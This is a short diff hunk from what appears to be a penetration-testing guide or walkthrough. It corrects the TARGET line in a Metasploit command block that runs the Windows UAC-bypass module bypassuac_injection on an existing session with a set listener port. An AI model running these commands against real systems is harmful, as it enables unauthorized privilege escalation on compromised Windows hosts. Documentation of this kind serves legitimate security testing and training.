@@ -2698,7 +2698,7 @@ y
 use exploit/windows/local/bypassuac_injection
 set SESSION <session-id>
 set LPORT 4433
-set TARGET\ x64
+set TARGET windows\ x64
 run
 ```
 
